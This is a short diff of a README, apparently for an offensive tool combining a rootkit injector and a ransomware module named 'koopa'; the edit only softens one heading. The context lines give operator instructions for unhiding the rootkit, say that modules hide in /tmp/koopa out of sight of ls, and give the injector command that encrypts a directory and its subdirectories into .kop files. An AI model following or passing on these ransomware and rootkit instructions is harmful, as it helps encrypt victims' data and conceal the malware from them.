@@ -14,7 +14,7 @@ or you could build your own injector using my library Caps(it should be in madli
 3. unhiding the rootkit (./injector -u 127.0.0.1)
 4. full guide on the injector is (./injector -h)
 
-THE GOOD SHIT( RANSOM MODULE):
+THE GOOD STUFF( RANSOM MODULE):
 1. modules are in /tmp/koopa and cant be found using ls or stuff of the sort
 2. btw the encrypted files have a .kop extension(KOOPA)
 3. to encrypt a dir and its subdirs (./injector -p /Your/Path/To/Encrypt -e 127.0.0.1)
